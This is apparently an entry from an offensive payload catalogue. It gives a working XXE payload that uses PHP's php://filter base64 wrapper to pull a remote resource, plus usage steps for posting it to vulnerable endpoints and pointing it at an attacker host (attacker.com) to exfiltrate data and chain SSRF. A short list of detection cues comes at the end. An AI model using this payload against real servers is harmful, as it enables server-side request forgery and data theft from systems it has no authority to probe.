---
id: 82434722-6b21-4902-83db-dc7688288534
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.188327+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xxe
  - php-wrapper
  - remote-resource
  - base64-encode
  - ssrf
platforms:
  - Web
  - Linux
validated: true
---

# XXE-PHP-Wrapper-Base64-Encode-Remote-Resource

## Code

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

## Description

This XML payload uses XXE to attempt retrieval and base64-encoding of a remote resource via the PHP php://filter wrapper combined with a URL. The entity '%xxe' is defined as a parameter entity for the remote HTTP resource, which expands in the <foo> element upon parsing. This can facilitate SSRF or out-of-band data exfiltration if the server allows remote stream access, embedding the encoded content in the response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| resource= | URL of the remote resource to encode and retrieve | http://10.0.0.3 or http://attacker.com/file.txt |

## Usage

POST the payload to an XXE-vulnerable endpoint. If successful, the response includes the base64-encoded remote content in the <foo> tag. Adapt the URL to attacker-controlled servers for exfiltration. Useful for chaining XXE with SSRF in PHP apps.

## Detection

- Intrusion detection for XML with parameter entities (%xxe) or remote URLs in DTDs.
- PHP logs for allow_url_fopen or stream context errors.
- Outbound connections from the web server to unexpected IPs/ports.
- Response analysis for embedded base64 from remote fetches.

## Related

- [[procedures/XXE-File-Retrieval-with-PHP-Wrapper]]
